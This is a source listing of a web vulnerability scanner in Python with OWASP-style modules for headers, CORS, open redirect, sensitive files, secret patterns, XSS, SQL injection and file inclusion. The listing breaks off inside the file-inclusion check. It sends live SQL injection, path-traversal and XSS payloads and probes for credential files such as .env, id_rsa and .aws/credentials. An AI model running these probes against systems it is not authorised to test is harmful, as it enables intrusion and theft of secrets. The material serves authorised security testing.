# ── A01 — RECON & FINGERPRINTING ─────────────────────────────────────────────

def module_recon(target,session):
    findings=[]; logger.log("RECON","DNS + tech fingerprinting …")
    domain=get_domain(target)
    try:
        ip=socket.gethostbyname(domain)
        logger.log("RECON",f"Resolved {domain} → {ip}","SUCCESS")
        findings.append(make_finding("recon","DNS Resolution","Info",
            f"{domain} → {ip}","Verify IP is not exposing internal infrastructure.",url=target))
    except: pass
    resp=safe_get(session,target)
    if not resp: return findings
    for hdr,title,rec in [
        ("Server","Server Banner Disclosure","Suppress version in Server header."),
        ("X-Powered-By","X-Powered-By Disclosure","Remove X-Powered-By header."),
        ("X-Generator","X-Generator Disclosure","Remove X-Generator header."),
        ("X-AspNet-Version","ASP.NET Version Disclosure","Set enableVersionHeader=false."),
        ("X-Runtime","Ruby Runtime Disclosure","Remove X-Runtime header."),
    ]:
        val=resp.headers.get(hdr,"")
        if val:
            findings.append(make_finding("recon",title,"Low",f"{hdr}: '{val}'",rec,url=target,cwe="CWE-200"))
    SIGS={"WordPress":{"body":["wp-content","wp-includes","wp-json"]},
          "Joomla":{"body":["joomla","/media/jui/"]},
          "Drupal":{"hdrs":["X-Drupal-Cache"]},
          "Laravel":{"body":["laravel_session","XSRF-TOKEN"]},
          "Django":{"body":["csrfmiddlewaretoken"]},
          "ASP.NET":{"hdrs":["X-AspNet-Version"],"body":["__VIEWSTATE"]},
          "Spring Boot":{"body":["Whitelabel Error Page"]},
          "React/Next.js":{"body":["_reactRootContainer","__NEXT_DATA__"]},
          "Angular":{"body":["ng-version","ng-app"]},
          "Vue.js":{"body":["data-v-","__vue"]},
          "Ruby on Rails":{"hdrs":["X-Runtime"],"body":["authenticity_token"]},
          "Symfony":{"body":["sf_redirect","symfony"]},
          "Magento":{"body":["mage_cookies","Mage.Cookies"]},
          "Shopify":{"body":["shopify","cdn.shopify"]},}
    body=resp.text.lower(); hstr=str(resp.headers).lower()
    det=[t for t,s in SIGS.items()
         if any(h.lower() in hstr for h in s.get("hdrs",[]))
         or any(b.lower() in body for b in s.get("body",[]))]
    if det:
        findings.append(make_finding("recon","Technology Stack Identified","Info",
            f"Detected: {', '.join(det)}","Keep all frameworks updated.",url=target))
    return findings

# ── A05 — SECURITY HEADERS ────────────────────────────────────────────────────
def module_security_headers(target,session):
    findings=[]; logger.log("HEADERS","Security header audit …")
    resp=safe_get(session,target)
    if not resp: return findings
    h=resp.headers
    for header,sev,desc,rec,cwe in [
        ("Strict-Transport-Security","High","Missing HSTS.",
         "Add HSTS: max-age=31536000; includeSubDomains","CWE-319"),
        ("Content-Security-Policy","Medium","No CSP header.",
         "Define a strict Content-Security-Policy.","CWE-693"),
        ("X-Frame-Options","Medium","Missing X-Frame-Options.",
         "Set X-Frame-Options: DENY.","CWE-1021"),
        ("X-Content-Type-Options","Low","Missing nosniff.",
         "Add X-Content-Type-Options: nosniff","CWE-693"),
        ("Referrer-Policy","Low","Missing Referrer-Policy.",
         "Add Referrer-Policy: strict-origin-when-cross-origin","CWE-200"),
        ("Permissions-Policy","Low","No Permissions-Policy.",
         "Restrict unused browser APIs.","CWE-693"),
    ]:
        if header not in h:
            findings.append(make_finding("headers",f"Missing {header}",sev,desc,rec,url=target,cwe=cwe))
    csp=h.get("Content-Security-Policy","")
    if csp:
        weak=[d for d in("'unsafe-inline'","'unsafe-eval'") if d in csp]
        if "*" in csp: weak.append("wildcard(*)")
        if "http:" in csp: weak.append("http: allowed")
        if weak:
            findings.append(make_finding("headers","Weak CSP Directives","Medium",
                f"Risky: {', '.join(weak)}","Remove unsafe directives.",url=target,cwe="CWE-693"))
    return findings

# ── A02 — SSL/TLS ─────────────────────────────────────────────────────────────
def module_ssl(target):
    findings=[]; logger.log("SSL","SSL/TLS check …")
    if not target.startswith("https://"):
        findings.append(make_finding("ssl","HTTP Only — No Encryption","High",
            "Plain HTTP — all data in cleartext.",
            "Migrate to HTTPS; add 301 redirect.",url=target,cwe="CWE-319")); return findings
    try: requests.get(target,verify=True,timeout=TIMEOUT)
    except requests.exceptions.SSLError as e:
        findings.append(make_finding("ssl","Invalid SSL Certificate","Medium",
            str(e)[:200],"Use a valid cert from a trusted CA.",url=target,cwe="CWE-295"))
    except: pass
    try:
        r=requests.get(target.replace("https://","http://",1),timeout=TIMEOUT,verify=False,allow_redirects=False)
        if r.status_code not in(301,302,307,308) or "https" not in r.headers.get("Location",""):
            findings.append(make_finding("ssl","HTTP Not Redirected to HTTPS","Medium",
                "HTTP doesn't redirect to HTTPS.","Add 301 HTTP→HTTPS redirect.",url=target,cwe="CWE-319"))
    except: pass
    return findings

# ── A02 — WEAK CRYPTOGRAPHY INDICATORS ────────────────────────────────────────
def module_weak_crypto(target,session):
    findings=[]; logger.log("WEAK-CRYPTO","Cryptographic weakness indicators …")
    resp=safe_get(session,target)
    if not resp: return findings
    h=resp.headers; body=resp.text
    # Weak hash algorithms in response
    for pattern,title,desc in [
        (r"MD5\s*\([^)]{1,40}\)",       "MD5 Hash Used","MD5 is cryptographically broken."),
        (r"SHA1\s*\([^)]{1,40}\)",      "SHA1 Hash Used","SHA1 is deprecated for security purposes."),
        (r"DES\s+encrypted",            "DES Encryption","DES is insecure — key size too small."),
        (r"RC4\s+cipher",               "RC4 Cipher","RC4 is broken."),
    ]:
        if re.search(pattern,body,re.I):
            findings.append(make_finding("ssl",title,"Medium",desc,
                "Upgrade to SHA-256/SHA-3, AES-256, or TLS 1.3.",url=target,cwe="CWE-327"))
    return findings

# ── A07 — COOKIES ─────────────────────────────────────────────────────────────
def module_cookies(target,session):
    findings=[]; logger.log("COOKIES","Cookie flag audit …")
    resp=safe_get(session,target)
    if not resp: return findings
    try: raws=resp.raw.headers.getlist("Set-Cookie")
    except: raws=[resp.headers.get("Set-Cookie","")]
    for raw in raws:
        if not raw: continue
        rl=raw.lower(); name=raw.split("=")[0].strip()[:30]
        for flag,sev,title,desc,rec,cwe in [
            ("httponly","Low",f"Cookie '{name}' Missing HttpOnly",
             "JS-accessible — XSS session theft possible.","Add HttpOnly.","CWE-1004"),
            ("secure","Medium",f"Cookie '{name}' Missing Secure",
             "Cookie may leak over HTTP.","Add Secure attribute.","CWE-614"),
            ("samesite","Low",f"Cookie '{name}' Missing SameSite",
             "CSRF risk without SameSite.","Set SameSite=Lax or Strict.","CWE-352"),
        ]:
            if flag not in rl:
                findings.append(make_finding("cookies",title,sev,desc,rec,url=target,cwe=cwe))
        break  # one set per first cookie
    return findings

# ── A05 — CORS ────────────────────────────────────────────────────────────────
def module_cors(target,session):
    findings=[]; logger.log("CORS","CORS policy test …")
    EVIL="https://evil-dd-confirm-4x0.com"
    for origin,desc in [(EVIL,"arbitrary origin"),(f"https://evil.{get_domain(target)}","evil subdomain"),("null","null origin")]:
        try:
            r=session.get(target,headers={"Origin":origin},timeout=TIMEOUT,allow_redirects=False)
            acao=r.headers.get("Access-Control-Allow-Origin","")
            acac=r.headers.get("Access-Control-Allow-Credentials","").lower()
            if "evil-dd-confirm-4x0.com" in acao and acac=="true":
                logger.log("CORS","CRITICAL: arbitrary origin + credentials!","CRITICAL")
                findings.append(make_finding("cors","Critical CORS Misconfiguration","Critical",
                    f"Reflects {desc} + Allow-Credentials:true. Account takeover risk.",
                    "Whitelist only trusted origins.",url=target,cwe="CWE-942",confidence="High")); return findings
            elif acao=="*":
                findings.append(make_finding("cors","Wildcard CORS Origin","Low",
                    "ACAO:* allows any domain.","Restrict to trusted origins.",url=target,cwe="CWE-942"))
            elif "evil-dd-confirm-4x0.com" in acao:
                findings.append(make_finding("cors","Reflected CORS Origin","Medium",
                    f"Reflects {desc}.","Validate Origin against allowlist.",url=target,cwe="CWE-942"))
        except: pass
    return findings

# ── A01/A03 — CSRF ────────────────────────────────────────────────────────────
def module_csrf(target,session):
    findings=[]; logger.log("CSRF","CSRF check …")
    resp=safe_get(session,target)
    if not resp: return findings
    forms=re.findall(r"<form[^>]*>(.*?)</form>",resp.text,re.S|re.I)
    vuln=[f for f in forms if re.search(r'method=["\']?post["\']?',f,re.I)
          and not re.search(r"csrf|_token|authenticity_token|__RequestVerification|nonce",f,re.I)]
    if vuln:
        findings.append(make_finding("csrf",f"Missing CSRF Token ({len(vuln)} form(s))","Medium",
            f"{len(vuln)} POST forms lack CSRF protection.",
            "Add synchronised CSRF tokens to all state-changing forms.",url=target,cwe="CWE-352"))
    return findings

# ── A05 — CLICKJACKING ────────────────────────────────────────────────────────
def module_clickjacking(target,session):
    findings=[]; logger.log("CLICKJACK","IFrame check …")
    resp=safe_get(session,target)
    if not resp: return findings
    if not resp.headers.get("X-Frame-Options") and "frame-ancestors" not in resp.headers.get("Content-Security-Policy",""):
        findings.append(make_finding("clickjacking","Page Embeddable in IFrame","Medium",
            "No X-Frame-Options or CSP frame-ancestors.","Set X-Frame-Options: DENY.",url=target,cwe="CWE-1021"))
    return findings

# ── A01 — OPEN REDIRECT ───────────────────────────────────────────────────────
def module_open_redirect(target,session):
    findings=[]; logger.log("REDIRECT","Open redirect …")
    EVIL="https://evil-dd-redir-4x0.com"
    PARAMS=["url","redirect","next","return","returnTo","redir","goto","continue","forward","dest","location","back","ref"]
    tested=set()
    for p in list(dict.fromkeys(extract_params(target)+PARAMS))[:MAX_PARAMS]:
        if p in tested: continue
        tested.add(p)
        try:
            r=session.get(inject_param(target,p,EVIL),timeout=TIMEOUT,allow_redirects=False)
            if "evil-dd-redir-4x0.com" in r.headers.get("Location",""):
                findings.append(make_finding("open_redirect",f"Open Redirect in '{p}'","Medium",
                    f"Redirects to attacker domain via '{p}'.",
                    "Validate all redirect targets against a trusted allowlist.",
                    url=inject_param(target,p,EVIL),payload=EVIL,cwe="CWE-601")); break
        except: pass
    return findings

# ── A05 — HTTP METHODS ────────────────────────────────────────────────────────
def module_http_methods(target,session):
    findings=[]; logger.log("METHODS","HTTP method check …")
    try:
        r=session.options(target,timeout=TIMEOUT); allow=r.headers.get("Allow","").upper()
        for m in ["PUT","DELETE","TRACE","DEBUG","CONNECT","PROPFIND"]:
            if m in allow:
                sev="High" if m in("PUT","DELETE","DEBUG") else "Medium"
                findings.append(make_finding("http_methods",f"Dangerous Method: {m}",sev,
                    f"Server allows {m}.","Disable unless required.",url=target,cwe="CWE-650"))
    except: pass
    try:
        r=session.request("TRACE",target,timeout=TIMEOUT)
        if r.status_code==200 and "TRACE" in r.text.upper():
            findings.append(make_finding("http_methods","Cross-Site Tracing (XST)","Low",
                "TRACE enabled.","Disable TRACE.",url=target,cwe="CWE-16"))
    except: pass
    return findings

# ── A03 — HOST HEADER INJECTION ───────────────────────────────────────────────
def module_host_header(target,session):
    findings=[]; logger.log("HOST-HDR","Host header injection …")
    evil="evil-dd-hostinject-4x0.com"
    for hdr in ["Host","X-Forwarded-Host","X-Host"]:
        try:
            r=session.get(target,headers={hdr:evil},timeout=TIMEOUT,allow_redirects=False)
            if evil in r.text or evil in r.headers.get("Location",""):
                findings.append(make_finding("host_header",f"Host Header Injection via '{hdr}'","Medium",
                    f"Injected host reflected. Password-reset poisoning risk.",
                    "Whitelist expected hostnames.",url=target,payload=f"{hdr}: {evil}",cwe="CWE-20")); break
        except: pass
    return findings

# ── A05 — INFORMATION DISCLOSURE ─────────────────────────────────────────────
def module_info_disclosure(target,session):
    findings=[]; logger.log("INFO-DISC","Error page disclosure …")
    for path in [f"/{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}","/?id=1'"]:
        url=target.rstrip("/")+path
        try:
            resp=session.get(url,timeout=TIMEOUT); body=resp.text
            for pat,title,sev,cwe in [
                (r"<b>Warning</b>:.*on line <b>\d+</b>","PHP Warning","Medium","CWE-200"),
                (r"Fatal error:.*on line \d+","PHP Fatal Error","High","CWE-209"),
                (r"Stack Trace:","Stack Trace Exposed","High","CWE-209"),
                (r"Traceback \(most recent call last\)","Python Traceback","High","CWE-209"),
                (r"ORA-\d{5}","Oracle DB Error","High","CWE-209"),
                (r"You have an error in your SQL syntax","MySQL Error","High","CWE-89"),
                (r"Microsoft.*OLE DB.*error","MSSQL Error","High","CWE-209"),
                (r"Werkzeug Debugger","Werkzeug Debug Console","Critical","CWE-94"),
                (r"DEBUG =.*True","Django Debug Mode","High","CWE-200"),
            ]:
                if re.search(pat,body,re.I):
                    findings.append(make_finding("info_disclosure",title,sev,
                        f"Leaked at {url}","Disable debug; use generic error pages.",url=url,cwe=cwe))
        except: pass
    return findings

# ── A05 — SENSITIVE FILES ─────────────────────────────────────────────────────
def module_sensitive_files(target,session):
    findings=[]; logger.log("SENSITIVE","55+ path checks …")
    CHECKS=[
        (".git/HEAD","ref:","Git Repo Exposed","Critical","CWE-538"),
        (".git/config","[core]","Git Config Exposed","Critical","CWE-538"),
        (".svn/entries","","SVN Repo Exposed","Critical","CWE-538"),
        (".env","=","Environment File Exposed","Critical","CWE-312"),
        (".env.local","=","env.local Exposed","Critical","CWE-312"),
        (".env.production","=",".env.production Exposed","Critical","CWE-312"),
        ("config.php","<?php","PHP Config Exposed","Critical","CWE-312"),
        ("wp-config.php","DB_","WordPress Config Exposed","Critical","CWE-312"),
        ("settings.py","SECRET_KEY","Django Settings Exposed","Critical","CWE-312"),
        ("config/database.yml","adapter","Rails DB Config Exposed","Critical","CWE-312"),
        ("application.properties","datasource","Spring Properties Exposed","Critical","CWE-312"),
        ("appsettings.json","ConnectionString","AppSettings Exposed","Critical","CWE-312"),
        ("web.config","<configuration>","web.config Exposed","Critical","CWE-312"),
        (".htpasswd",":","htpasswd Exposed","Critical","CWE-312"),
        ("backup.sql","CREATE TABLE","SQL Backup Exposed","Critical","CWE-538"),
        ("dump.sql","INSERT INTO","SQL Dump Exposed","Critical","CWE-538"),
        ("backup.tar.gz","","Backup Archive Exposed","Critical","CWE-538"),
        ("backup.zip","","Backup ZIP Exposed","Critical","CWE-538"),
        ("phpinfo.php","phpinfo()","phpinfo() Exposed","High","CWE-200"),
        ("server-status","Apache Server","Apache server-status","Medium","CWE-200"),
        ("Dockerfile","FROM","Dockerfile Exposed","Medium","CWE-538"),
        ("docker-compose.yml","services:","Docker Compose Exposed","Medium","CWE-538"),
        ("swagger.json",'"swagger"',"Swagger API Docs","Medium","CWE-200"),
        ("openapi.json",'"openapi"',"OpenAPI Spec","Medium","CWE-200"),
        ("actuator",'"status"',"Spring Actuator","High","CWE-200"),
        ("actuator/env",'"activeProfiles"',"Actuator /env","Critical","CWE-200"),
        ("actuator/heapdump","","Heap Dump Exposed","Critical","CWE-200"),
        ("graphiql","GraphiQL","GraphiQL IDE","High","CWE-200"),
        ("console","Werkzeug","Werkzeug Console","Critical","CWE-94"),
        ("admin","","Admin Panel","High","CWE-284"),
        ("phpmyadmin","phpMyAdmin","phpMyAdmin","Critical","CWE-284"),
        ("adminer.php","Adminer","Adminer DB Tool","Critical","CWE-284"),
        ("id_rsa","PRIVATE KEY","Private SSH Key","Critical","CWE-312"),
        ("server.key","PRIVATE KEY","Server Key","Critical","CWE-312"),
        (".aws/credentials","aws_access","AWS Credentials","Critical","CWE-312"),
        ("robots.txt","Disallow:","Robots.txt","Info","CWE-200"),
        ("sitemap.xml","<urlset","Sitemap","Info","CWE-200"),
        (".travis.yml","","Travis CI Config","Low","CWE-538"),
        ("Jenkinsfile","pipeline","Jenkinsfile","Medium","CWE-538"),
        (".circleci/config.yml","","CircleCI Config","Low","CWE-538"),
        ("crossdomain.xml","<cross-domain","Flash Cross-Domain","Low","CWE-942"),
        ("package.json",'"name"',"package.json Exposed","Low","CWE-200"),
        ("composer.json",'"require"',"composer.json Exposed","Low","CWE-200"),
        ("Gemfile","gem ","Gemfile Exposed","Low","CWE-200"),
        ("requirements.txt","","requirements.txt Exposed","Low","CWE-200"),
        ("wp-admin/","WordPress","WP Admin Panel","High","CWE-284"),
        ("_debug/default","Symfony","Symfony Profiler","High","CWE-200"),
        ("_profiler","Symfony","Symfony Profiler","High","CWE-200"),
        ("h2-console","H2 Console","H2 DB Console","Critical","CWE-284"),
        ("kibana","","Kibana Exposed","High","CWE-284"),
        ("grafana","Grafana","Grafana Exposed","High","CWE-284"),
        ("jenkins","Jenkins","Jenkins Exposed","High","CWE-284"),
        ("gitlab","GitLab","GitLab Exposed","High","CWE-284"),
        ("sonarqube","SonarQube","SonarQube Exposed","Medium","CWE-284"),
    ]
    base=target.rstrip("/")
    def chk(item):
        path,ind,title,sev,cwe=item
        try:
            r=session.get(f"{base}/{path}",timeout=TIMEOUT,allow_redirects=False)
            if r.status_code!=200: return None
            sample=r.text[:8192]
            if ind and ind.lower() not in sample.lower(): return None
            if len(sample)<10: return None
            logger.log("SENSITIVE",f"EXPOSED: /{path}","CRITICAL")
            return make_finding("sensitive_files",title,sev,
                f"/{path} publicly accessible.","Remove/deny immediately.",
                url=f"{base}/{path}",cwe=cwe,confidence="High")
        except: return None
    with ThreadPoolExecutor(max_workers=12) as ex:
        for r in ex.map(chk,CHECKS):
            if r: findings.append(r)
    return findings

# ── A02 — SECRET LEAKAGE ──────────────────────────────────────────────────────
def module_secrets(target,session):
    findings=[]; logger.log("SECRETS","Secret detection …")
    PATTERNS={
        "AWS Access Key"   :(r"AKIA[0-9A-Z]{16}",3.5),
        "Google API Key"   :(r"AIza[0-9A-Za-z\-_]{35}",3.5),
        "GitHub Token"     :(r"ghp_[0-9A-Za-z]{36}",3.5),
        "Slack Token"      :(r"xoxb-[0-9A-Za-z\-]{24,34}",3.5),
        "Stripe Key"       :(r"sk_live_[0-9a-zA-Z]{24}",3.5),
        "JWT Token"        :(r"eyJ[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}",3.0),
        "Private Key PEM"  :(r"-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----",0.0),
        "Database URL"     :(r"(?i)(mysql|postgres|mongodb|redis)://\w[^\s'\"]{8,}",2.5),
        "Basic Auth URL"   :(r"https?://[^:@\s]{3,}:[^:@\s]{3,}@",2.5),
        "Generic API Key"  :(r"(?i)api[_\-]?key[\"'\s:=]+['\"]?[A-Za-z0-9\-_]{20,}",3.0),
        "Bearer Token"     :(r"(?i)bearer\s+[A-Za-z0-9\-_\.]{20,}",3.0),
        "Telegram Bot"     :(r"[0-9]{8,10}:[A-Za-z0-9_\-]{35}",3.5),
        "Azure Storage"    :(r"DefaultEndpointsProtocol=https;AccountName=",0.0),
        "SendGrid Key"     :(r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}",3.5),
        "Heroku API"       :(r"[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",0.0),
    }
    resp=safe_get(session,target)
    if not resp: return findings
    for name,(pat,min_e) in PATTERNS.items():
        m=re.search(pat,resp.text)
        if m:
            val=m.group(0)
            if min_e>0 and entropy(val)<min_e: continue
            sample=val[:25]+"…"
            logger.log("SECRETS",f"⚠  {name} FOUND!","CRITICAL")
            findings.append(make_finding("secrets",f"Leaked: {name}","Critical",
                f"'{name}' in response. Sample: {sample}",
                "Revoke/rotate immediately. Move secrets server-side.",
                url=target,cwe="CWE-312",confidence="High"))
    return findings

# ── A03 — XSS (Zero-FP) ───────────────────────────────────────────────────────
def module_xss(target, session):
    """
    A03/T1059.007: Reflected XSS — zero-FP via:
    1. Unique per-scan + per-param canary
    2. Baseline must NOT contain canary
    3. Attack response MUST contain raw (un-encoded) canary
    4. Content-Type must be text/html
    5. Benign-injection gate: inject same-length random string — if that also reflects, skip (echo-all param)
    6. Encoding check: canary not present as HTML entity
    """
    findings = []
    ctx = get_ctx()

    PAYLOADS = [
        ('<CANARY>', 'basic tag'),
        ('"><CANARY>', 'attr-break'),
        ("'><CANARY>",  'sq-break'),
        ('</title><CANARY>', 'title-break'),
        ('javascript:CANARY', 'js-uri'),
        ('CANARY', 'plain reflect'),
    ]

    FUZZ = ["q","s","search","id","name","lang","keyword","query","page","input",
            "msg","text","title","value","data","content","type","cat","term",
            "user","username","email","subject","body","comment","note","ref",
            "redirect","url","next","redir","callback","return","dest","src"]

    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]
    if ctx:
        params = ctx.prioritise_params(params)

    for p in params:
        # Unique canary PER PARAM
        CANARY = f"ddX{hashlib.md5((str(time.time())+p).encode()).hexdigest()[:10]}"

        # Gate 1: canary must not appear in baseline
        bl = ctx.baseline(target) if ctx else safe_get(session, target)
        if not bl or CANARY in bl.text:
            continue

        # Gate 2: benign probe — inject random same-length string
        #         if benign string is also reflected, param echoes everything → skip
        BENIGN = f"ddBn{hashlib.md5((CANARY+'b').encode()).hexdigest()[:10]}"
        try:
            bn_resp = session.get(inject_param(target, p, BENIGN), timeout=TIMEOUT)
            if bn_resp and BENIGN in bn_resp.text:
                continue  # Echo-all param — would be FP
        except Exception:
            pass

        for template, desc in _variants(PAYLOADS):
            pl = template.replace('CANARY', CANARY)
            try:
                resp = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                if not resp:
                    continue
                ct = resp.headers.get("Content-Type","")

                # Gate 3: Content-Type must be HTML
                if "text/html" not in ct and "application/xhtml" not in ct:
                    continue

                # Gate 4: Raw canary must be in response
                if CANARY not in resp.text:
                    continue

                # Gate 5: Must NOT be HTML-entity encoded
                encoded_forms = [
                    f"&lt;{CANARY}&gt;",
                    f"&#60;{CANARY}&#62;",
                    CANARY.replace('<','&lt;').replace('>','&gt;'),
                ]
                if any(enc in resp.text for enc in encoded_forms):
                    continue  # Properly encoded — not vulnerable

                # Gate 6: Canary not inside HTML comment
                if f"<!--{CANARY}" in resp.text or f"<!-- {CANARY}" in resp.text:
                    continue

                # Gate 7: Response must differ from baseline
                if ctx and ctx.similar_to_baseline(resp.text, target, threshold=0.98):
                    continue

                logger.log("XSS", f"Reflected XSS confirmed in '{p}' ({desc})", "CRITICAL")
                findings.append(make_finding("xss",
                    f"Reflected XSS in Parameter '{p}'", "High",
                    f"Canary '{CANARY[:12]}…' reflected unencoded in HTML via param '{p}'. Payload: {pl[:60]}",
                    "HTML-encode all output. Use auto-escaping templates. Implement strict CSP.",
                    url=inject_param(target, p, pl),
                    payload=pl, cwe="CWE-79", confidence="High",
                    evidence=f"desc={desc}, ct={ct.split(';')[0]}"))
                break  # One finding per param

            except Exception:
                pass
    return findings


def module_sqli(target, session):
    """
    A03/T1190: SQL Injection — zero-FP via 5 confirmation gates:
    Error-based: pattern must be in attack AND absent from baseline
    Boolean: response MUST change >50% AND baseline must be stable across 2 requests
    Time-based: median of 3 timing measurements vs 3 baseline measurements
    """
    findings = []
    ctx = get_ctx()

    ERR_PAT = {
        "MySQL"     : re.compile(r"SQL syntax.*MySQL|You have an error in your SQL syntax|"
                                  r"MySQLSyntaxErrorException|mysql_fetch_array\(\)|"
                                  r"mysqli_fetch", re.I),
        "PostgreSQL": re.compile(r"PostgreSQL.*ERROR|pg_query\(\)|PSQLException|"
                                  r"org\.postgresql\.util\.PSQLException|"
                                  r"ERROR:\s+syntax error at", re.I),
        "MSSQL"     : re.compile(r"Driver.*SQL.*Server|Unclosed quotation mark|"
                                  r"SqlException|OLE DB.*SQL Server|"
                                  r"Incorrect syntax near", re.I),
        "Oracle"    : re.compile(r"ORA-\d{5}|oracle.*error|"
                                  r"quoted string not properly terminated", re.I),
        "SQLite"    : re.compile(r"SQLite/JDBCDriver|sqlite3\.OperationalError|"
                                  r"\[SQLITE_ERROR\]|SQLiteException", re.I),
        "DB2"       : re.compile(r"DB2 SQL error|SQLCODE|DB2Exception", re.I),
    }

    FUZZ = ["id","user","name","search","cat","item","page","product",
            "pid","uid","ref","order","sort","limit","from","to","key","val"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]
    if ctx:
        params = ctx.prioritise_params(params)

    # ── Baseline stability check ──────────────────────────────────────────────
    # Fetch baseline twice — if they differ >10%, page is dynamic → skip bool-blind
    try:
        bl1 = session.get(target, timeout=TIMEOUT)
        bl2 = session.get(target, timeout=TIMEOUT)
        bl_text    = bl1.text if bl1 else ""
        bl_len     = len(bl_text)
        bl_dynamic = bl1 and bl2 and abs(len(bl1.text)-len(bl2.text)) / max(len(bl1.text),1) > 0.10
    except Exception:
        bl_text    = ""
        bl_len     = 0
        bl_dynamic = True

    # ── Baseline must not already contain DB errors ───────────────────────────
    for db, pat in ERR_PAT.items():
        if pat.search(bl_text):
            logger.log("SQLI", f"Baseline already shows {db} error — skipping", "WARNING")
            return findings

    for p in params:
        # ── Error-based ────────────────────────────────────────────────────────
        for pl in _variants(["'", "''", '"', "1' AND 1=1--", "' OR '1'='1' --",
                   "1 UNION SELECT NULL--", "1; SELECT 1--"]):
            try:
                resp = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                if not resp: continue
                # Must not be identical to baseline (FP: error on all inputs)
                if resp.text == bl_text: continue
                for db, pat in ERR_PAT.items():
                    m = pat.search(resp.text)
                    if m:
                        # Gate: matched string must NOT appear in baseline
                        if pat.search(bl_text): continue
                        # Gate: matched string must be in HTML text, not in a comment or script
                        # Quick check: matched pos must not be inside <!-- ... --> or // comment
                        pos = resp.text.find(m.group(0))
                        preceding = resp.text[max(0,pos-200):pos]
                        if '<!--' in preceding and '-->' not in preceding: continue
                        if '//' in preceding.split('\n')[-1]: continue

                        logger.log("SQLI", f"Error-based SQLi ({db}) in '{p}'", "CRITICAL")
                        findings.append(make_finding("sqli",
                            f"Error-Based SQL Injection in '{p}' ({db})", "Critical",
                            f"{db} error appeared with payload '{pl}' in parameter '{p}'.",
                            "Use parameterised queries (prepared statements) everywhere. "
                            "Disable verbose DB error output.",
                            url=inject_param(target, p, pl),
                            payload=pl, cwe="CWE-89", confidence="High",
                            evidence=m.group(0)[:120]))
                        return findings
            except Exception:
                pass

        # ── Boolean-based (skip if page is dynamic) ────────────────────────────
        if not bl_dynamic and bl_len > 0:
            for tp, fp in [("' AND '1'='1'--","' AND '1'='2'--"),
                           ("1 AND 1=1--",    "1 AND 1=0--"),
                           ("1' AND '1'='1",  "1' AND '1'='0")]:
                try:
                    tr = session.get(inject_param(target, p, tp), timeout=TIMEOUT)
                    fr = session.get(inject_param(target, p, fp), timeout=TIMEOUT)
                    if not tr or not fr: continue
                    tl, fl = len(tr.text), len(fr.text)
                    # Gate 1: true-response must be ≥90% similar to baseline
                    t_drift = abs(tl - bl_len) / bl_len
                    if t_drift > 0.10: continue
                    # Gate 2: true vs false must differ by >50% (raised from 30%)
                    tf_ratio = abs(tl - fl) / max(tl, 1)
                    if tf_ratio < 0.50: continue
                    # Gate 3: fetch true again to confirm stability
                    tr2 = session.get(inject_param(target, p, tp), timeout=TIMEOUT)
                    if not tr2: continue
                    if abs(len(tr2.text) - tl) / max(tl,1) > 0.08: continue
                    logger.log("SQLI", f"Boolean-blind SQLi in '{p}' (diff={int(tf_ratio*100)}%)", "CRITICAL")
                    findings.append(make_finding("sqli",
                        f"Boolean-Based Blind SQL Injection in '{p}'", "Critical",
                        f"True/False payloads produce {int(tf_ratio*100)}% body-length difference. "
                        f"True response stable across 2 requests.",
                        "Use parameterised queries everywhere.",
                        url=inject_param(target, p, tp),
                        payload=f"TRUE: {tp} | FALSE: {fp}",
                        cwe="CWE-89", confidence="Medium"))
                    break
                except Exception:
                    pass

        # ── Time-based (median of 3 vs 3 baseline timings) ────────────────────
        for pl, delay_s, db in [
            ("'; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
            ("' AND SLEEP(5)--",            5, "MySQL"),
            ("'; SELECT pg_sleep(5)--",      5, "PostgreSQL"),
            ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--", 5, "SQLite"),
        ]:
            try:
                # Measure 3 baseline requests, take median
                import statistics
                bl_times = []
                for _ in range(3):
                    t0 = time.time()
                    session.get(target, timeout=TIMEOUT)
                    bl_times.append(time.time() - t0)
                bl_med = statistics.median(bl_times)
                if bl_med >= 3: continue  # Baseline already slow — skip

                # Measure attack (2 confirmations required)
                confirmed = 0
                for _ in range(2):
                    t0 = time.time()
                    session.get(inject_param(target, p, pl), timeout=delay_s + 10)
                    atk_t = time.time() - t0
                    if atk_t >= delay_s * 0.85 and atk_t > bl_med + delay_s * 0.7:
                        confirmed += 1
                if confirmed >= 2:
                    logger.log("SQLI", f"Time-based SQLi ({db}) in '{p}' confirmed x2", "CRITICAL")
                    findings.append(make_finding("sqli",
                        f"Time-Based Blind SQL Injection in '{p}' ({db})", "Critical",
                        f"Response delayed ≥{delay_s}s on 2/2 attempts. Baseline: {bl_med:.1f}s.",
                        "Use parameterised queries everywhere.",
                        url=inject_param(target, p, pl),
                        payload=pl, cwe="CWE-89", confidence="High"))
                    break
            except Exception:
                pass

    return findings


def module_lfi(target,session):
    """
    A01/T1083: LFI — zero-FP via:
    1. Indicator must be absent from baseline
    2. Strict pattern matching for file content indicators
    """
    findings=[]
    ctx = get_ctx()
    PAYLOADS=[("../../../../etc/passwd",["root:x:0:0","bin:x:","daemon:x:"]),
              ("../../../../etc/passwd%00",["root:x:0:0"]),
              ("..\\..\\..\\..\\windows\\win.ini",["[extensions]","for 16-bit"]),
              ("....//....//....//etc/passwd",["root:x:0:0"]),
              ("php://filter/convert.base64-encode/resource=index.php",["PD9waHA","PCFET0"]),]
    FUZZ=["page","file","include","read","path","load","doc","template","view","module","src","resource"]
    params=list(dict.fromkeys(extract_params(target)+FUZZ))[:MAX_PARAMS]
    if ctx:
        params = ctx.prioritise_params(params)

    try:
        bl=session.get(target,timeout=TIMEOUT)
        bl_text=bl.text if bl else ""
    except:
        bl_text=""

    for p in params:
        for pl,indicators in PAYLOADS:
            try:
                resp=session.get(inject_param(target,p,pl),timeout=TIMEOUT)
                if not resp: continue
                # Gate 1: must differ from baseline to prevent FP on static pages
